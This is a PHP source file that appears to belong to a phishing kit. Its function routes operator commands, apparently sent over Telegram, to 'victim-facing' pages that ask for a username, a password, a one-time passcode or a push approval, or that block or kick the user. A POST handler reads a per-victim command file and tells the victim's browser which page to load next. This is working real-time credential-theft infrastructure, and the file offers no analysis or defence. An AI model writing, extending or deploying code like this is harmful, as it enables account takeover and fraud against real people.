<?php

/**
 * Map Telegram command strings to victim-facing page filenames (relative to accounts/).
 */
function getTargetPage($command) {
    $command = trim((string) $command);
    switch ($command) {
        case 'approve_access':
            return 'user.php';
        case 'block_access':
            return '404.php';
        case 'captcha_check':
            return 'captcha.php';
        case 'ask_user':
            return 'user.php';
        case 'ask_pwd':
            return 'password.php';
        case 'ask_tap':
            return 'dp.php';
        case 'ask_otp':
            return 'otp.php';
        case 'finish':
            return 'complete.php';
        case 'kick_user':
        case 'ban_user':
            return '../../disconnect.php';
        default:
            return '';
    }
}

// POST handler: only when this script is requested directly (not when included from detect.php).
$script = $_SERVER['SCRIPT_FILENAME'] ?? '';
$isDirect = ($script !== '' && realpath($script) === realpath(__FILE__));

if ($isDirect && ($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
    if (isset($_GET['id'])) {
        $directory = __DIR__ . '/../client-area/commands/';
        $filename = $directory . trim($_GET['id']) . '.txt';
        if (file_exists($filename)) {
            $command = trim((string) file_get_contents($filename));
            @unlink($filename);
            $target = getTargetPage($command);
            header('Content-Type: text/plain; charset=UTF-8');
            echo $target;
            exit;
        }
    }
    header('Content-Type: text/plain; charset=UTF-8');
    echo '';
    exit;
}
